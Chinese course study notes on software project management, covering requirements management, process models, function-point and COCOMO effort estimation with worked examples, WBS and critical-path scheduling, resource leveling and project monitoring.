需求跟踪：通过比较需求文档与后续工作成果之间的对应关系，建立与维护“需求跟踪矩阵”，确保产品依据需求文档进行开发。 需求变更：依据“变更申请－审批－更改－重新确认”的流程处理需求的变更，防止需求变更失去控制而导致项目发生混乱。 需求开发主要困难（重点） 知识技能问题 态度问题 合作关系（需求分析员与用户，开发方与用户） 用户说不清楚需求 双方误解需求 开发人员写不好需求文档 用户经常变更需求 如何开展需求调查准备调查 首先，需求分析员应当起草需求调查问题表，将调查重点锁定在该问题表内，否则调查工作将变得漫无边际。 其次，需求分析员应当确定需求调查的方式 与用户交谈，向用户提问题。向用户群体发调查问卷。参观用户的工作流程，观察用户的操作。与同行、专家交谈，听取他们的意见。分析已经存在的同类软件产品，提取需求。从行业标准、规则中提取需求。 从Internet上搜查相关资料。 最后，需求分析员与被调查者建立联系，确定调查的时间、地点、人员等，撰写需求调查计划。要特别留意的是不要漏掉典型的用户 执行调查 准备工作完毕后，需求分析员按照计划执行调查。在调查过程中随时记录（或存储）需求信息 。 《用户需求说明书》与《产品需求规格说明书》的主要区别与联系 前者主要采用自然语言（和应用域术语）来表达用户需求，其内容相对于后者而言比较粗略，不够详细。 后者是前者的细化，更多地采用计算机语言和图形符号来刻画需求，产品需求是软件系统设计的直接依据。 两者之间可能并不存在一一影射关系，因为软件开发商会根据产品发展战略、企业当前状况适当地调整产品需求，例如用户需求可能被分配到软件的数个版本中。软件开发人员应当依据《产品需求规格说明书》来开发当前产品。 撰写《用户需求说明书》如何开展需求分析需求分析的概念：在需求开发过程中，对所获取的需求信息进行分析，及时排除错误和弥补不足，确保需求文档正确地反映用户的真实意图 问答分析方法 建模分析法 做出决策 如何定义产品需求 细化并分析用户需求 撰写产品需求规格说明书 进行需求确认 需求管理（确认、跟踪、变更控制）需求确认需求确认是指开发方和客户方共同对《产品需求规格说明书》进行评审，双方对需求达成共识后作出承诺。需求确认包含两个重要工作：“需求评审”和“需求承诺”。 需求评审面临的困难（重点） 需求评审的一个通病是“虎头蛇尾”。需求评审的确乏味，也比较费脑子。刚开始评审时，大家都比较认真，越到后头越马虎。 需求评审涉及的人员可能比较多，有些时候让这么多人聚在一起花费比较长的时间开会并不容易 开评审会议时经常会“跑题”，导致评审效率很低 评审会议时经常会发生争议，争吵不仅对评审工作没有好处，而且会无意中伤害同事们的感情 人们在很多时候分不清楚自己究竟是“坚持真理”还是“固执己见” 需求跟踪 需求跟踪的目的是建立与维护“需求－设计－编程－测试”之间的一致性，确保所有的工作成果符合用户需求。 需求跟踪有两种方式：正向跟踪。检查《产品需求规格说明书》中的每个需求是否都能在后继工作成果中找到对应点。逆向跟踪。检查设计文档、代码、测试用例等工作成果是否都能在《产品需求规格说明书》中找到出处。 正向跟踪和逆向跟踪合称为“双向跟踪”。不论采用何种跟踪方式，都要建立与维护需求跟踪矩阵（即表格）。需求跟踪矩阵保存了需求与后继工作成果的对应关系。 需求变更控制需求发生变更的起因主要有： 随着项目的进展，人们（包括开发方和客户方）对需求的了解越来越深入。原先的需求文档可能存在这样那样的错误或不足，因此要变更需求。 市场发生了变化，原先的需求文档可能跟不上当前的市场需求，因此要变更需求。 对项目开发小组而言，变更需求意味着要调整资源、重新分配任务、修改前期工作成果等，开发小组要为此付出较重的代价。 第五章 软件开发过程软件开发过程的概念和组成过程的概念：针对一个给定目的地一系列操作步骤软件开发过程的概念：按照项目的进度、成本和质量限制，开发和维护满足用户需求的软件所必需的一组有序的软件开发活动集合 软件开发过程的组成： 软件开发活动 软件开发活动之间的关系 为什么需要软件开发过程 明确了软件开发的过程和步骤，促进工程化软件开发 便于制定软件项目计划 为软件开发提供了可视性，便于对软件开发过程进行管理和控制 便于细化和安排任务，使得每个人员明确各自的工作 软件开发活动的概念及类型，活动之间关系及活动描述（重点）概念：为开发软件项目而执行的一项具有明确任务的具体工作类型： 技术活动对软件项目实施开发，产生软件产品例如，需求分析，概要设计，编码，单元测试等等 管理活动对软件项目中的人、产品和过程等实施管理的活动例如，制订软件项目计划，软件配置等等 软件开发活动间的关系：软件开发活动之间的次序反映了活动之间的依赖关系 逻辑一个软件开发活动输出是另一个软件开发活动的输入例如，需求分析和软件设计之间 时间一个软件开发活动需等到另一个软件开发活动完成之后才能执行 如何定义软件开发活动及常见的软件开发活动（重点） 名称 任务 输入: 开始所必需满足的条件 输出: 完成时所必须满足的条件以及结果 实施: 做什么，怎么做(详细的步骤)，或者如何从输入产生输出 例子：常见的软件开发活动：技术活动 需求分析 概要设计 详细设计 编码 集成测试 撰写出版物 用户确认测试 软件发布 管理活动 制定初步软件开发计划 制定详细软件开发计划 制定软件配置管理计划 制定软件质量保证计划 项目跟踪和监督 配置管理 用户培训 软件开发过程模型（重点）什么是软件开发过程模型： 软件开发模型是软件开发全过程、软件开发活动以及它们之间关系的的结构框架 指导软件开发，以及软件开发过程的定义 常用的软件开发过程模型（重点）： 瀑布模型 原型模型 增量模型 迭代模型 螺旋模型 过程模型选择的影响因素技术选择将影响 开发人员的训练要求 人员招聘 开发环境－硬件和软件 系统维护安排 分析项目的特征 目标驱动还是产品驱动 面向数据还面向控制 通用的还是专用的 是否涉及需要专用工具支持的专门技术 是否需要特殊的安全性要求 对软硬件有何要求 影响因素： 识别项目中的高风险 产品的不确定性。系统需求理解的准确性，用户开始时有可能对系统该是什么样都无法确定。在某些环境中，精确而有效的需求描述可能迅速变得过时 过程的不确定性。在项目开始时要选择项目方法或过程模型或新的工具，任何对原先采用的开发方法的变换都将引进不确定性。 资源的不确定性。项目过程中资源可能发生变化 瀑布模型（重点）特点： 所有过程模型的鼻祖 强调阶段的划分及其顺序性 强调各阶段工作及其文档的完备性 每个阶段结束之前，从技术和管理两个角度进行严格的审查 是一种严格线性的、按阶段顺序的、逐步细化的开发模式 适合场景： 所有功能、性能等要求能一次理解和描述时；一个定义很好的系统进行维护或移植到新平台上时 所有的系统功能一次交付时；必须同时淘汰全部老系统时 容易理解但很复杂的项目；特别关注质量，对时间，成本不太关注的项目 当开发队伍的技术力量比较薄弱或经验缺乏时 风险与缺点： 获得完善的需求规约是非常困难的； 难以适应快速变化需求； 系统太大时,难以一次做完； 反馈信息慢； 极可能引起开发后期的大量返工，如返工到需求、设计等早期活动； 瀑布模型变种——V模型（强调验证过程）瀑布模型的变种—生鱼片模型（各阶段有重叠）传统的瀑布模型强调阶段之间的最小重叠，而生鱼片模型强调大幅度的重叠，即在需求分析之前就可以进行架构设计和部分的详细设计优点：加快进度缺点：过程跟踪和控制带来问题 螺旋模型 缺点：比较复杂，需要责任心，专业和管理方面的知识应用场所：开发风险较大的软件项目 原型模型（重点）特点 有效适应用户需求的变化 不知循环多少次，进度难以控制 适合场所 需求动态变化、难以确定的软件系统 原型的好处 从实践中学习（learning by doing） 改善的通信 改善的用户参与 使部分已知的需求清晰化 展示描述的一致性和完整性 可能减少文档 减少维护成本 特征约束（利用工具构造原型可将某些特性落到实处，非写在纸上那样容易失误） 体验结果 原型的缺点： 用户有时误解原型的角色，如他们可能误解原型应和真实系统一样可靠 缺少项目标准时，进化原型法有点像编码修正 缺少控制，由于用户不断提出新要求，原型法的叠代周期难以控制 额外的花费：研究表明构造一个原型可能需要10％的额外费用 运行效率受影响 与用户亲密沟通有时做不到，如软件外包 阶段交付模型持续地在确定阶段向用户展示软件和渐进原型不同，在阶段交付的时候，你明确知道下一步要完成什么工作。 特点：不会在项目结束的时候一下交付全部软件，而是在整个项目中持续不断交付阶段成果 优点：项目结束交付全部成果前，分阶段将有用的功能交付给用户缺点：如果管理层和技术层面上缺乏仔细的规划，工作就无法进行 增量模型 基本过程：开发一个产品的版本，展示给用户，根据反馈改善产品 特点： 并行开发 管理复杂 结合渐进原型和阶段交付模型的过程模型 如果计划满足用户绝大多数需求，增量模型与渐进原型差不多，如果计划满足用户少量的需求，增量模型与阶段交付原型差不多 渐进原型强调，系统看得见的样子，再回来堵漏洞，增量模型强调系统的核心和底层系统的功能 增量模型优点： 从早期的增量的反馈来改进后面的阶段 由于阶段设计与其实现之间跨度较短，减少需求变更的可能性 用户早期能得到效益 有些早期交付可改进现金流 较小型的子项目更于控制和管理 对于不需要的或不使用的需求是不重要的，或出现在下一增量任务中 如果突然出现更多的紧急任务，项目可临时放弃 增加开发人员的成就感，能短时间、定时看到自己的劳动成果 不足之处： 后面的增量可能要求修改早期的增量 迭代模型特点 通过逐步迭代，建立软件系统 面向对象技术适合场所 需求没有/难以完整定义的软件 Scrum 一个快捷轻便的过程 一个迭代式增量软件开发过程 一个适应和经验型的系统管理 现存软件工程实践的包装 一个提高软件生产效率,改善沟通和合作的方法 SCRUM方法的开发过程 计划和体系结构设计（确定性过程） Sprint（经验性过程） 交付和巩固（确定性过程） 第六章 软件工作量度量软件度量、测量、估算的概念软件度量(Metrics)：是指对软件产品、软件开发过程或者资源的简单属性的定量描述软件测量(Measure)：是对软件产品、软件开发过程和资源复杂属性的定量描述，用于事后或实时状态，如软件可靠性估算(Estimation)：软件产品、软件开发过程和资源复杂属性的定量描述，用于事前, 如软件开发成本 产品：软件开发过程中所生成的各种文档和程序 过程：与软件开发有关的各种活动，如软件设计等 资源：软件开发过程中所需支持，如人员、费用等 为什么需要软件度量任何工程化的工作都需要度量 软件工程也不例外，准确了解工程的实施情况项目实施之前 辅助制定软件项目的计划 估算成本和工作量，以便制定计划项目实施过程中 提供软件开发的可视性 跟踪和控制软件项目的开发 评估软件开发质量，进行质量控制 加强风险管理项目实施之后 对项目的实施情况进行评估 为后续项目的积累经验数据 软件度量的内容三个方面 产品：各种文档和程序 过程：各种软件开发活动 资源：各种资源如人员、费用等 二个层次 内部属性 外部属性 软件度量方法（重点）面向规模的度量对于每一个项目，可以根据表格中列出的基本数据计算简单的面向规模的生产率和质量的度量优点 简单易行，自然直观缺点 依赖于程序设计语言的表达能力和功能 软件开发初期很难估算出最终软件的代码行数 对精巧的软件项目不合适 只适合于过程式程序设计语言 面向功能的度量面向功能的软件度量是对软件和软件开发过程的间接度量。 面向功能度量主要考虑程序的“功能性”和“实用性”，而不是对LOC计数。 该度量是一种叫做功能点方法的生产率度量法，利用软件信息域中的一些计数和软件复杂性估计的经验关系式而导出功能点FP。 计算功能点，使用如下的关系式：FP ＝ 总计数×( 0.65+ 0.01×SUM ( Fi ) ) Fi（i＝1..14）是复杂性校正值，它们应通过逐一回答下一页的提问来确定。Fi的取值0..5： 0 没有影响 1 偶然的 2 适中的 3 普通的 4 重要的 5 极重要的 SUM（Fi）是求和函数。 CT的计算方法 用户输入数×加权因子(简单=3,平均=4,复杂=6) 用户输出数×加权因子(简单=4,平均=5,复杂=7) 用户查询数×加权因子(简单=3,平均=4,复杂=6) 文件数×加权因子(简单=7,平均=10,复杂=15) 外部界面数×加权因子(简单=5,平均=7,复杂=10) 系统是否需要可靠的备份和恢复？ 是否需要数据通信？ 是否有分布处理的功能？ 是否性能成为关键？ 系统是否运行在既存的高度实用化的操作环境中？ 系统是否需要联机数据项？ 联机数据项是否需要建立多重窗口显示和操作，以处理输入处理。 主文件是否联机更新？ 输入、输出、文件、查询是否复杂？ 内部处理过程是否复杂？ 程序代码是否可复用？ 设计中是否包括了转移和安装？ 系统是否设计成可以重复安装在不同机构中 系统是否设计成易修改和易使用？ 一旦计算出功能点，就可仿照LOC的方式度量软件的生产率、质量和其它属性： 生产率 ＝ FP／PM（人月） 质量 ＝ 错误数／FP 成本 ＝ 元／FP 文档 ＝ 文档页数／FP. 优点 与程序设计语言无关, 在开发前就可以估算出软件项目的规模(事前)不足 没有直接涉及算法的复杂度，不适合算法比较复杂的软件系统； 功能点计算主要靠经验公式，主观因素比较多 数据不好采集 软件估算（重点）估算内容 规模 工作量 进度 关键计算机资源 成本 现在已使用的实用技术是时间和工作量估算。估算资源、成本和进度时需要经验、有用的历史信息、足够的定量数据。估算本身带有风险。 软件项目成本和工作量估算极为重要 计算机系统中软件成本占总成本的比例很大 用户和项目管理人员对软件成本和工作量估算都很重视 软件估算的影响因素 历史信息的可用性要考虑不同的环境，编程语言、软件工具、标准和人员经验 项目规模直接计算实际成本或时间是不可能的。编写同样程序，不同的人所需时间是有显著不同。通常工作量表示为源代码的数量（source line of code,SLOC）或千行代码量（KLOC） 项目复杂性相同的KLOC的两个程序，不同的人所需时间是有显著不同。不能简单的应用SLOC或KLOC，需根据复杂行进行修正 结构不确定性，即需求被确定的程度，功能被分解的容易程度等 成本与工作量的估算 承诺估计 参照和依据已完成项目的历史数据（对比法） 自上而下（将大项目分解为小项目，工作分解结构） 自下而上的估计：适合后期阶段的估计 将项目按照软件生命周期分解 根据经验估算公式 请专家估计（Delphi技术） 帕金森法：先估计人数量，后判断 赢的价格：以比较低的合同价来估计 标准Deiphi技术① 组织者发给每位专家一份软件系统规格说明书和一张记录估算值的表格，请他们进行估算。② 专家详细研究软件规格说明书的内容，对该软件提出三个规模的估算值，即： ai（最小） mi（可能） bi（最大），无记名地填写表格， 在填表的过程中，专家互相不进行讨论但可以向组织者提问。③ 组织者对专家们填在表格中的答复进行整理： a. 计算各位专家估算的期望值 Ei; b. 对专家的估算结果分类摘要。专家对此估算值另做一次估算。④ 在综合专家估算结果的基础上，组织专家再次无记名地填写表格。 比较两次估算的结果。若差异很大，则要通过查询找出差异的原因。⑤ 上述过程可重复多次。最终可获得一个得到多数专家共识的软件规模（源代码行数）。在此过程中不得进行小组讨论。 基于代码行工作量估算软件项目规模影响软件项目成本和工作量估算出FP或者LOC期望值e = (a + 4m + b)/6a：乐观值b：可能值c：悲观值 扩展： 根据PM = FP(LOC)/ E 计算出工作量 （工作量 = （规模 = 代码行） / 生产率） 根据C = S/FP(LOC) 计算出成本 （总成本 = 工作量 x 单人工资）PM：工作量C：总成本S：每个人每个月成本 例子：需求分析及设计工作量：41/6+33=39.83 人日设计检查工作量：1+1+1=3 人日测试工作量：4+4+4=12 人日编码工作量：900+900+900=2700 行，假设工程师每天编码效率为270 行，则为 10 人日集成及安装：6 人日总工作量 E 为 39.83+3+12+10+6=70.83 人日如果公司平均每日工资为 300 元，则总成本：300×70.83=21249 元 功能点分析步骤1：估算 5 类型功能点数量 外部输入类型：更新系统内部文件的输入活动 外部输出类型：输出给用户的信息或数据 内部逻辑文件：系统所用的固定文件 外部接口文件：与其他系统交换信息 外部查询类型：在线输入获得立即结果，不更新内部文件 步骤2：权衡加权因子 功能点复杂度加权因子： 用户输入数×加权因子(简单=3,平均=4,复杂=6) 用户输出数×加权因子(简单=4,平均=5,复杂=7) 用户查询数×加权因子(简单=3,平均=4,复杂=6) 文件数×加权因子(简单=7,平均=10,复杂=15) 外部界面数×加权因子(简单=5,平均=7,复杂=10) 估算计数=（乐观值+4*可能值+悲观值）/6，功能点计数=估算计数×加权因子 步骤3：确定复杂度校正因子（共 14 个，值为 0-5）即下列公式的Fi 系统是否需要可靠的备份和恢复？ 是否需要数据通信？ 是否有分布处理的功能？ 是否性能成为关键？ 系统是否运行在既存的高度实用化的操作环境中？ 系统是否需要联机数据项？ 联机数据项是否需要建立多重窗口显示和操作，以处理输入处理。 主文件是否联机更新？ 输入、输出、文件、查询是否复杂？ 内部处理过程是否复杂？ 程序代码是否可复用？ 设计中是否包括了转移和安装？ 系统是否设计成可以重复安装在不同机构中 系统是否设计成易修改和易使用？ 步骤4：计算功能点，使用如下经验关系式：FP =总计数×( 0.65＋0.01×SUM ( Fi ) ) 步骤5：计算工作量和成本工作量 = FP（功能点数）/ 生产率（点/人日）成本 = 工作量 * 人均工资 例子：基础功能点复杂因子：FP =总计数×( 0.65＋0.01×SUM ( Fi ) )=114×(0.65+52×0.01)=133设公司人均效率 2 个功能点/天，日工资 300 元。工作量 E：133/2=68.5 人日成本：68.5×300=20550 元 软件估算的经验模型IBM模型IBM模型是静态单变量模型。 L 是源代码行数(KLOC) E 是工作量(PM,人月) D 是项目持续时间(月) S 是人员需要量(人) DOC 是文档数量(页) 在此模型中，一般指一条机器指令为一行源代码 一个软件的源代码行数不包括程序注释、作业命令、调试程序在内。 对于非机器指令编写的源程序，例如汇编语言或高级语言程序，应转换成机器指令源代码行数来考虑。 转换系数＝机器指令条数／非机器语言执行步数。如：Fortran的转换系数为4~6 CoCoMo模型CoCoMo模型的层次 － 支持不同的阶段 基本COCoMo模型系统开发的初期，估算整个系统的工作量(包括维护)和软件开发和维护所需的时间 中间COCoMo模型估算各个子系统的工作量和开发时间 详细COCoMo模型估算独立的软构件，如各个子系统的各个模块的工作量和开发时间 基本CoCoMo模型：123&#96;&#96;&#96;D &#x3D; c * E^d&#96;&#96;&#96;;D是开发时间(月) ，c和d是经验常数参与开发的人数：E&#x2F;D&#96;&#96;&#96;成本 &#x3D; E * 每日工资 * 一个月工作多少天 例子：已知代码行数：目标代码行33.2kLOC E = 3.0*(33.2)1.12 =152 PM D = 2.5*(152)0.35 = 14.5 (月) 参加项目人数N = E/D = 152/14.5 = 11(人) 特点：不稳定 中间CoCoMo模型1234567891011121314E表示工作量(人月)，EAF表示工作量调节因子，a,b为经验常数![](&#x2F;images&#x2F;assets&#x2F;20200514182713429.png)EAF的取值(范围)- 很低、低、正常、高、很高、极高- Boehm建议取值范围[0.70-1.66]![](&#x2F;images&#x2F;assets&#x2F;20200514183257339.png)其中，工作量因子：![](&#x2F;images&#x2F;assets&#x2F;20200514194648952.png)![](&#x2F;images&#x2F;assets&#x2F;20200514194733126.png)![](&#x2F;images&#x2F;assets&#x2F;20200517115830787.png)一个规模为10KDSI的商用微机远程通信的嵌入型软件，使用中间COCOMO模型进行成本估算![](&#x2F;images&#x2F;assets&#x2F;20200514195505559.png)&#96;&#96;&#96;成本 &#x3D; 工作量（人月） * 每日工资 * 工作天数 估算技巧 分解估算（过程分解和模块分解）和的误差大于误差的和 给出估计一个范围（如最好情况下）或一个可信赖程度（如90%的把握）。期望值=（乐观值+4*一般值+悲观值）/ 6 避免无准备的估算不要随便说出一个 估算留出估算的时间，并做好计划 使用以前项目的数据 估算师和开发人员共同估算 走查估算 分类法估算 不要忽略普通任务 使用软件估算工具 使用几种不同估算方法，并比较它们的结果 项目进行中改变估算规则 第七章 软件项目计划什么是软件项目计划（重点）软件项目计划是对软件项目实施所涉及的活动、人员的安排、任务的划分、开发进度、资源的分配和使用等方面作出的预先规划 活动和任务 资源及其安排 进度计划 为什么需要软件项目计划（重点） 有序、可控制地对软件项目进行管理 确保活动在正确的时间有正确的资源可用 避免不同的活动在相同的时间竞争相同的资源 为每个员工分配任务 实际的进度有标准进行衡量 产生成本的消耗计划 根据项目的实际，调整项目计划 生产高质量的软件产品 确保员工的士气高昂，员工保持高生产率 及时交付软件产品，降低软件开发成本 成功地进入市场 客户满意度 及时发布产品新版本 制定软件项目计划应该考虑的因素软件项目计划制定的方式自顶向下 由一个或者一部分人单独完成 目的是服务于高层领导和用户，而不是项目组 主要依据项目进度的要求和约束，针对项目中的重大活动(如需求分析、软件设计等)而制定的一个粗略的软件项目计划 只能作为目标进度表，不能作为实施进度表 自底向上 计划由计划制订者负责，所有项目组成员参与制定 一般供项目组，用于实际项目的实施 要求项目组成员事先了解和认可 详细定义了计划中的所有活动(不仅仅是哪些重大活动)，明确了活动的参与者、持续时间以及活动之间的关系 软件开发活动什么是软件开发活动？ 为开发软件项目而执行的一项具有明确任务的具体工作 例如，需求分析，执行单元测试，制定软件项目开发计划等 软件开发过程中存在许多相互关联的软件开发活动 明确的任务 非孤立，和其他活动存在关联 按任务性质，软件开发活动可分为二种形式 技术活动对软件项目实施开发，产生软件产品例如，需求分析，概要设计，编码，单元测试等等 管理活动对软件项目中的人、产品和过程等实施管理的活动例如，制订软件项目计划，软件配置等等 技术活动 需求分析 概要设计 详细设计 编码 集成测试 撰写出版物 用户确认测试 软件发布 管理活动 制定初步软件开发计划 制定详细软件开发计划 制定软件配置管理计划 制定软件质量保证计划 项目跟踪和监督 配置管理 用户培训 如何定义软件开发活动? 名称 任务 输入: 开始所必需满足的条件 输出: 完成时所必须满足的条件以及结果 实施: 做什么，怎么做(详细的步骤)，或者如何从输入产生输出 软件活动例子: 单元测试 任务 对软件基本单元模块进行测试，判断是否有错 输入 有一个已完成、被文档化和批准的软件单元测试计划 供测试的软件单元模块代码 实施 遵循单元测试计划，运行了所有的测试用例 撰写了单元测试报告 输出 单元测试报告 软件开发活动之间的关系软件开发活动之间的次序反映了活动之间的依赖关系 逻辑一个软件开发活动输出是另一个软件开发活动的输入例如，需求分析和软件设计之间 时间一个软件开发活动需等到另一个软件开发活动完成之后才能执行例如，集成测试和确认测试 活动之间有哪些关系？ 结束到开始 开始到开始 结束到结束 开始到结束 结束到开始：开始到开始：结束到结束： WBS的构造方法（重点） 识别出项目中（包括技术活动、管理活动）中的主要交付物 资产管理系统中的交付物有哪些？ 主要交付物总是根据项目实际是如何组织来定义的 项目生命周期的各阶段可以作为第一层次，并将项目交付物作为第二层次每个分支的组织方法可以不一样 例子：每天起床的WBS 如何验证WBS的正确性和完整性： 判断对这一层次是否能够对成本和日期进行评估，如果不能，继续分解，否则该分支分解结束 识别交付物的组成部分。组成部分必须是实际的、可验证的部件 验证分解的正确性。 是否被分解的条目对子项目是否充分必要，如果不是，则需要增、删、合或修改是否每一条目被清晰定义是否每一条目能够被合理地计划，成本规划，被分配给合适的组织或团队、个人 输出WBS最底下的一层，称为工作包（work package） 示例： CPM的构造方法与原则CPM的一些构造规则（重点） 项目网络只有一个起点 项目网络只有一个终点 连接有持续时间 节点无持续时间 时间从左到右 节点顺序编号 网络能不包含回路 （错） 网络不能包含悬点（错） 前继：某活动的紧前活动 CPM构造方法估算活动周期 细分活动活动的粒度越小，估算的准确度就会越高 借鉴历史数据积累历史数据 使用估算模型例如，CoCoMo模型 考虑缓冲时间缓冲时间保证项目按照计划有足够的时间来完成活动 缓冲时间意外事件的缓冲意外事件可能会发生(如全企业的培训)例如，需求分析计划从8.1开始共需20个工作日，应该8.29日完成，但中间公司要开展2天的全员培训，因此8.31结束节假日时间的缓冲例如，编码计划从9.31开始，工作量为10个工作日，因为国庆放假1周，因此，应该计划在10.21日完成 不要在计划中考虑加班时间，加班是不可避免得，但是考虑了加班，可能会发生更多的加班 综合考虑其他因素 考虑节假日以工作日(而不是星期)规定活动周期考虑参与活动团队的教育、培训、经验和技能水平考虑教育和培训需要 考虑评审所化的时间考虑传播时间考虑团队中成员的其他工作考虑硬件、工具和人员的效率考虑活动的迭代和重复活动之间有一定的缓冲…… 工作量的分布： 活动中加入时间（重点）关键路径法主要关注的两个目标： 尽快完成整个项目 识别哪些一旦延期将对整个项目周期产生影响的活动 对每个活动赋予持续时间后，可采用前向路径（forward pass）计算项目和各活动最早结束时间；采用反向路径（backward pass），计算项目和各活动最晚结束时间。 CPM中节点的表示（重点） 事件代号(Event number) 最早日期(Earliest date)最早开始和最早结束 最晚日期(Latest date)最晚开始和最晚结束 缓冲时间(Slack)最晚结束时间-最早结束时间最晚开始时间-最早开始时间 例子先从前往后填写最早时间：第一步：第二步：第三步：第四步：第五步：第六步：再从后往前填最晚时间：第七步：第八步：第九步：第十步：第十一步：第十二步：前后向路径计算完成后的活动表： 关键路径（重点）时间的最早结束时间和最晚结束时间的差，成为缓冲时间。它表示一个事件推迟多少时间可以不影响项目的结束。Slack为0的事件为关键事件，将关键事件连接起来的最长路径为关键路径 为什么要考虑关键路径： 关键路径上活动的进度直接影响到整个项目的进度 必须保证关键路径上的资源和活动顺利进行 如果关键路径上活动的进度受到影响，那么整个项目的进度肯定会受到影响 要缩短项目的开发周期，必须加快关键路径上活动的开发进度 上述案例中的关键路径： 活动的缓冲时间（重点）给个活动的缓冲时间是相关的。如果某个活动用了缓冲时间，后续的活动可能就没有缓冲时间。 空闲缓冲(free float):当前活动的最早结束时间和后继活动最早开始时间之差为空闲缓冲时间。它不影响其它活动。当前活动延期多长时间而不影响后继活动的最早开始时间，强调的是会不会影响后继活动的最早开始时间。 干预缓冲(interfering float)：活动的空闲缓冲时间与总缓冲时间之差。它反应空闲缓冲被使用后，活动还能被延时多少时间而不影响整个项目的结束时间。 缩短项目时间（重点） 减少关键活动的周期 整个项目活动的重组 过于乐观的软件项目计划出现的原因： 赶时间 为了迎合客户的不切实际的进度要求 估算不准确 需求变更(增加) 开发人员没有充分参与和承诺 产生乐观估计的根源： 为了赶在某些特定时间前展示或出售产品，如计算机交易会 管理人员和客户拒绝接受仅给出范围的估算，而是按照他们认为的最佳“估算”来制定进度计划 项目管理人员和开发人员为了享受挑战的乐趣或压力下工作的刺激，故意缩短进度 项目管理人员认为较紧的进度计划能够使员工勤奋工作 原先估计是合理的，但在项目进行过程中又加进了许多新特性，从而变成过于乐观的进度 过于乐观计划的后果： 计划的质量：错误的假设必将导致无效的项目规划 抛弃计划：当面临进度压力时，大多数开发组织抛弃原有计划，而走入盲目开发歧途 如果试图在关键阶段节省时间，必将在后续阶段加倍补偿 分散管理者的注意力：管理者将精力放在不断调整计划上 客户关系：项目一拖再拖，客户将失去耐心 仓促收尾 要排错只能将系统拆分后进行，一个小的变动要花很长时间开发人员清楚知道系统中存在一些应做修改却未做的地方测试人员发现错误的速度大于软件开发人员的速度排除已发现的错误的同时，产生大量新的错误 由于软件变化频繁，难以保证用户文档的同步更新目估算多次调整，软价交付日期一拖再拖 第八章 资源分配资源分配的目的 活动进度产生每个活动计划新的开始日期和结束日期 资源进度产生每个资源要求的日期以及要求的调度等级 成本进度产生资源使用过程中的计划的累计花费 资源的特性： 资源是执行项目过程中所需的人员或任何事物 有些资源是项目整个过程中都需要的，有些则在某些活动中需要，前者管理起来反而比后者简单 资源的分类（重点） 人力资源：项目团队成员（项目经理，需求分析员，系统分析员，设计人员，程序员，质量管理员，其它人员） 设备资源：包括服务器以及其它计算和办公室设备（打印机、传真机、打印纸、数据采集器等）；员工需要的桌椅 物料资源：设计硬件时才需要 场地资源：如果要容纳更多的人，就要考虑 服务资源：比如网络带宽，其它的支持软件 时间：每一项目中都要有的资源 金钱：必不可少的支持项目进行的资源，可购买其它资源 确定资源需求某个项目的优先网络：根据需要确定一定需求水平的各种资源，如：何种类型的员工及数量，设备的类型和数量等 资源需求列表： 平衡资源与资源调度（重点）我们将上述例子画成甘特图：绿色的部分代表缓冲区根据上图，画出某一个资源的资源需求直方图：纵轴——资源的数量横轴——项目的阶段（图中第一阶段没有画出）红线代表可用的资源数量画的方法：画一条平行于纵轴的线，将线从左向右移动，这一过程中某一时间点和这条线相交的活动的数量就是资源需求量的根据 资源的平衡方法通过将活动延期或将活动分解成几部分，使资源图变得均匀。蓝线代表：资源可用性还是一上面那个题为例：在上面项目中，现阶段的资源直方图在阶段2和阶段4期间要求4名，如何平衡直方图使得只使用3名分析/设计人员就能满足要求。由于只有3名分析/设计人员，将不得不延迟模块D的详细说明直到完成模块B的详细说明之后才开始，这样以来整个项目将延迟5天。如果希望项目在100天内完成，将重新设计活动图。在原来的活动图中，需要检查完所有的详细说明模块才能进行设计活动，这是个瓶颈。因而可先检查详细设计模块A、B、D后，就开始设计工作，详细设计模块C的检查另外进行修订后的优先网络图(假设有4名分析员)修订后的Gantt图及资源图(4人分析/设计) 活动优先权的设定（重点） 找到最佳的资源平衡图要耗时间且困难 资源分配给一个活动后，其它活动便不能再分配 多个活动需要同一资源时需要对资源进行排序 设置活动的优先权 有助于资源能以比较合理的方式分配给竞争的活动 先分配资源给关键路径，后分配给可能影响其它活动的活动 总缓冲期优先权 活动按总缓冲期排序，最小总缓冲期的活动具有最高的优先权 活动总是按总缓冲期的升序分配资源 随着项目的进展，如果有活动被拖延，总缓冲期将减少；重新计算总缓冲期，重排优先权列表 上述的例子：有序表优先权：可以同时进行的活动，按一组简单的准则来排序－Burman列表 最短关键活动 关键活动 最短非关键活动 有最少缓冲的非关键活动 非关键活动 考虑资源的特性 目的：分配任务合理，满足项目进度要求 在大型建筑领域，人力一般被看成平等的，各人的技能和效率可不考虑。 资源的可获得行(availability)：需要知道特定的人员在需要时是否可以获得 关键性(criticality)：将有经验的人员分配给关键路径上的活动 风险（risk）：标识项目中最大风险的活动；将有经验的人员分配到最高的风险活动 培训(training)：有充足的缓冲时间来培训初级员工开发非关键活动的技能 团队组建（team building） 第九章 软件项目监控软件项目监控示意图： 什么是软件项目监控在项目实施过程中，随时掌握项目的实际开发情况，使得当项目实施与计划相背离，或者出现问题和风险时，能够采取有效的措施 软件项目监控的基础 软件开发计划 活动和关系进度计划 资源和人员计划 成本计划，…… 软件项目实际实施过程 实施了的实际进度实施面临的问题 为什么需要对软件项目进行监控软件项目实施相对于计划的不确定性、动态性和实施过程中问题多样性和不可预知性及其带来的风险 不现实的截至日期 对工作量和资源数量估算不足 客户需求的动态变化 交流不畅而导致的项目延期 计划没有考虑风险 事先无法预知的技术问题 事先无法预知的人力困难 软件项目监控的内容（重点） 项目风险 项目进展 开发活动进展（实际的与计划的差别） 开发活动问题 项目展望 成本监控 软件项目风险软件项目在实施过程中存在各种问题和风险 技术风险，例如某项需求尚未找到合适的技术解决途径，或者原先所制定的技术解决途径发现不合适 进度风险，例如某项活动原先计划1个月时间完成，但是现在3个月过去了仅仅完成任务的一半 成本风险，由于没有控制支出，实际成本已经远远超过原先计划的成本预算，并且仍然不断增长 人员风险，项目组成员临时跳槽或者调派，人员缺乏 工具和设备风险，所需的工具和设备不能按时提供，或者得不到，…. 在项目监控过程中，识别风险以便管理风险 通过了解项目的实际实施情况，发现风险 详细描述风险 将各个风险组织以风险清单形式提交讨论 项目风险清单的内容 风险描述 负责人 风险处理的开始时间，可能会发生变更，保留历史 目标结束时间，可能会发生变更，保留历史 风险标识风险报告－交通灯法：询问项目成员完成计划的可能性识别评价项目中某项活动的关键元素将关键元素分解为子元素对每一元素 符合计划要求：绿灯 目前已经拖后，但可以恢复：黄灯 已经拖后，恢复很难：红灯例子：项目进展在项目实施过程中，项目的实际进度可能会与计划的进度产生偏差 